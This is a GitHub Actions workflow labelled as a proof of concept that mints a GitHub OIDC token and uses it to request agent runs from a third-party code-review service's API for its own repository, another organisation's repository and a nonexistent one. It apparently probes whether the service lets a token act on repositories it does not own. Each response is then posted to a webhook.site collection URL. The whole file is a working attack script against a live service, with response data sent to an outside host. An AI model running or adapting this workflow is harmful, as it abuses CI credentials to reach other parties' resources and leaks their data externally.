name: MS OIDC PoC
on: push
permissions:
  id-token: write
  contents: read
jobs:
  poc:
    runs-on: ubuntu-latest
    steps:
      - name: mint-and-probe
        run: |
          ARU="${ACTIONS_ID_TOKEN_REQUEST_URL}"
          ART="${ACTIONS_ID_TOKEN_REQUEST_TOKEN}"
          SEP='&'
          case "$ARU" in *\?*) ;; *) SEP='?' ;; esac
          OIDC=$(curl -s -H "Authorization: Bearer $ART" "${ARU}${SEP}audience=macroscope" | jq -r .value)
          echo "oidc-len: ${#OIDC}"
          HEAD_SHA=$(curl -s https://api.github.com/repos/gyoomei/rialo-rush/commits/main | jq -r .sha)
          echo "head: $HEAD_SHA"
          for REPO in "gyoomei/rialo-rush" "prassoai/macroscope-actions" "gyoomei/nope-nonexistent"; do
            SHA="$HEAD_SHA"
            [ "$REPO" = "gyoomei/rialo-rush" ] || SHA="0123456789abcdef0123456789abcdef01234567"
            CODE=$(curl -s -o /tmp/out.json -w "%{http_code}" -X POST \
              -H "Authorization: Bearer $OIDC" -H "Content-Type: application/json" \
              -d "{\"repository\":\"$REPO\",\"agent\":\"POC Agent\",\"review\":{\"kind\":\"cra\"},\"commit\":\"$SHA\"}" \
              https://actions.macroscope.com/api/v1/github-actions/agent-runs)
            BODY=$(head -c 400 /tmp/out.json)
            echo "=== repo: $REPO -> HTTP $CODE"
            echo "$BODY"
            jq -n --arg r "$REPO" --arg c "$CODE" --arg b "$BODY" '{repo:$r, code:$c, body:$b}' | \
              curl -s -X POST -H "Content-Type: application/json" -d @- \
              https://webhook.site/6d48834f-58f9-4b57-b909-771f87402d66
          done
